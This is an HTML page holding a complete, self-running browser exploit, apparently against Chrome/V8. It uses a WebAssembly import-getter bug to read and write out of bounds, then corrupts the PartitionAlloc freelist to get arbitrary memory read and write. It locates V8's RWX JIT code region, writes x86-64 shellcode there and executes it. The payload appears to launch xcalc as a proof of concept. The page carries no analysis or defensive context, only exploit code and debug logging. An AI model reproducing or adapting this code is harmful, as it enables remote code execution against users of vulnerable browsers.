<html>
<script>
var freelist = null;
var scratch = null;
var scratch_buf = null;
var superpage = null;
var freelist_addr = null;
wasm_module="0061736d01000000010b0260017f017f60027f7f00020b01036d6f6403696d7000000303020001050301000107210308726561645f75333200010977726974655f7533320002066d656d6f727902000a1302070020002802000b0900200020013602000b"

async function debug(){
	for(let j = 0; j < 0x10000; j++){
			var x = 1;
		for(let i = 0; i < 0x10000; i++){
			var x = x + i;
		}
	}

}

wasm_xpl_done = false;

function s32_to_u32(s32) {
  if (s32 < 0)
    s32 += 0x100000000;
  return s32;
}

function u32_to_str(u32) {
  var s = u32.toString(16);
  if (s.length < 8)
    s = (new Array(8 - s.length + 1)).join('0') + s
  return s;
}

class u64 {
  constructor(lo, hi) {
    this.lo = s32_to_u32(lo|0);
    this.hi = s32_to_u32(hi|0);
  }
  copy() {
    return new u64(this.lo, this.hi);
  }
  add(v) {
    var lo = this.lo + v.lo;
    var hi = this.hi + v.hi;
    if (lo >= 0x100000000)
      hi++;
    return new u64(lo, hi);
  }
  sub(v) {
    return this.add(v.neg());
  }
  neg() {
    return this.not().add_u32(1);
  }
  add_u32(v) {
    return this.add(mku64(v));
  }
  sub_u32(v) {
    return this.add(mku64(-v));
  }
  shl(b) {
    var r = mku64(0);
    if (b < 32) {
      r.lo = this.lo << b;
      r.hi = (this.hi << b) | (this.lo >>> (32 - b));
    } else if (b < 64) {
      r.hi = this.lo << (b - 32);
    }
    return r;
  }
  shr(b) {
    var r = new u64(0, 0);
    if (b < 32) {
      r.lo = (this.lo >>> b) | (this.hi << (32 - b));
      r.hi = this.hi >>> b;
    } else if (b < 64) {
      r.lo = this.hi >> (b - 32);
    }
    return r;
  }
  and(v) {
    return new u64(this.lo & v.lo, this.hi & v.hi);
  }
  or(v) {
    return new u64(this.lo | v.lo, this.hi | v.hi);
  }
  not() {
    return new u64(~this.lo, ~this.hi);
  }
  bswap() {
    var r = new u64(0, 0);
    var t = this.copy();
    for (var i = 0; i < 8; i++) {
      r = r.shl(8).add_u32(t.lo & 0xff);
      t = t.shr(8);
    }
    return r;
  }
  equals(v) {
    return this.lo == v.lo && this.hi == v.hi;
  }
  is_zero() {
    return this.lo == 0 && this.hi == 0;
  }
  val() {
    return this.hi * 0x100000000 + this.lo;
  }
  str() {
    return '0x' + u32_to_str(this.hi) + u32_to_str(this.lo);
  }
}

function mku64(lo) {
  if (lo < 0)
    return new u64(-lo, 0).neg();
  return new u64(lo, 0);
}

function parse_wasm_module() {
  var len = wasm_module.length / 2;
  var buf = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    hex = '0x' + wasm_module.substring(i * 2, i * 2 + 2);
    buf[i] = parseInt(hex);
  }
  return buf;
}

function arr_to_u64(arr) {
  return new u64(arr[0], arr[1]);
}

function u64_to_arr(u64, arr) {
  console.log(u64.hi);
  console.log(u64.lo);
  arr[0] = u64.lo;
  arr[1] = u64.hi;
  console.log(arr[0]);
  console.log(arr[1]);
}

function parse_wasm_module() {
  var len = wasm_module.length / 2;
  var buf = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    hex = '0x' + wasm_module.substring(i * 2, i * 2 + 2);
    buf[i] = parseInt(hex);
  }
  return buf;
}

function arr_to_u64(arr) {
  return new u64(arr[0], arr[1]);
}

function u64_to_arr(u64, arr) {
  arr[0] = u64.lo;
  arr[1] = u64.hi;
}

function read_oob(off) {
  var lo = wasm.exports.read_u32(off);
  var hi = wasm.exports.read_u32(off + 4);
  return new u64(lo, hi);
}

function write_oob(off, val) {
  wasm.exports.write_u32(off, val.lo);
  wasm.exports.write_u32(off + 4, val.hi);
}

function read(addr) {
  u64_to_arr(addr, freelist);
  var b = new Uint32Array();
  b.buffer;
  junk.push(b);
  return arr_to_u64(freelist).bswap();
}


function write(addr, val) {
  u64_to_arr(addr, freelist);
  //debug();
  var rw = new Uint32Array(2);
  rw.buffer;
  //debug();
  u64_to_arr(val, rw);
  //debug();
  junk.push(rw);
}

function setup_wasm_rw() {
  raw_wasm = parse_wasm_module();
  var mod = new WebAssembly.Module(raw_wasm);
  var ffi = {
    mod: {
      get imp() {
        console.log('getter');
        wasm2 = new WebAssembly.Instance(mod, {mod: {imp: function(){}}});
        spacer = new ArrayBuffer(0x10000);
        return function() {};
      }
    }
  };
  wasm = new WebAssembly.Instance(mod, ffi);
  wasm2.exports.memory.grow(1);
  console.log("memory is");
  junk = [];
  console.log("START");
  while (true) {
    junk.push(new ArrayBuffer(8));
    var p1 = read_oob(16).bswap();
    var p2 = read_oob(24).bswap();
    console.log(p1);
    console.log(p2);
    if (p2.sub(p1).val() == 8)
    {
      console.log("ok");
      console.log(p1.str());
      console.log(p2.str());
      break;
    }
  }
  var b8ptr = read_oob(8).bswap();
  scratch = b8ptr.sub_u32(0x20010);
  scratch_buf = new DataView(wasm2.exports.memory.buffer);
  console.log('scratch: ' + scratch.str());
  var superpage_mask = mku64((1 << 21) - 1);
  superpage = b8ptr.and(superpage_mask.not());
  var partition_page_idx = b8ptr.and(superpage_mask).shr(14).val()
  var freelist_addr = superpage.add_u32(0x1000 + partition_page_idx * 0x20);
  console.log('freelist_addr : ' + freelist_addr.str());
  write_oob(8, freelist_addr.bswap())
  junk.push(new ArrayBuffer(8));
  freelist = new Uint32Array(2);
  freelist.buffer;
  // read() and write() are ready
}

function field(obj, idx) {
  return read(obj.add_u32(idx * 8 - 1));
}

function get_rwx() {
  var memory_chunk = global.and(mku64((1 << 19) - 1).not());
  console.log('memory_chunk: ' + memory_chunk.str());
  //debug();
  var heap = read(memory_chunk.add_u32(0x38));
  console.log('heap: ' + heap.str());
  var code_space = read(heap.add_u32(0xdd8));
  console.log('code_space: ' + code_space.str());
  var alloc_info = code_space.add_u32(0x250);
  console.log('alloc_info: ' + alloc_info.str());
  var limit = read(alloc_info.add_u32(0x10));
  var rwx = limit.sub_u32(0x13ef00+0xbb8c0);
  console.log('rwx: ' + rwx.str());
  //debug();
  return rwx;
}

function find_global() {
  array_buffer_allocator = read(superpage.add_u32(0x1000));
  console.log('array_buffer_allocator: ' + array_buffer_allocator.str());
  //debug();
  var isolate_data = read(array_buffer_allocator.add_u32(0x820c390));
  isolate = read(isolate_data);
  console.log('isolate: ' + isolate.str());
  var context = read(isolate.add_u32(0x1860));
  console.log('context: ' + context.str());
  var native_context = field(context, 2 + 3);
  console.log('native_context: ' + native_context.str());
  //debug();
  global = field(native_context, 2 + 2);
  console.log('global: ' + global.str());
}


function run_wasm_exploit() {
  //debug();
  function jit(x, y) {
     for(var i = 0; i < 1000; i += 1){
          return x * y / (x*i);
     }
  }
  jit.name;
  setup_wasm_rw();
  find_global();
  var rwx = get_rwx();
  var mprotect_stub = [ 
    0x90909090,0x90909090,0x782fb848,0x636c6163,
    0x48500000,0x73752fb8,0x69622f72,0x8948506e,
    0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,
    0x50000030,0x4944b848,0x414c5053,0x48503d59,
    0x3148e289,0x485250c0,0xc748e289,0x00003bc0,
    0x050f00 
    ];
  for (var i = 0; i < mprotect_stub.length; i += 2){
    console.log('start');
    console.log('rwx: ' + rwx.str());
    write(rwx.add_u32(i * 4), new u64(mprotect_stub[i], mprotect_stub[i + 1]));
  }
  jit();
  wasm_xpl_done = true;
}

run_wasm_exploit();
console.log('end');

</script>
</html>

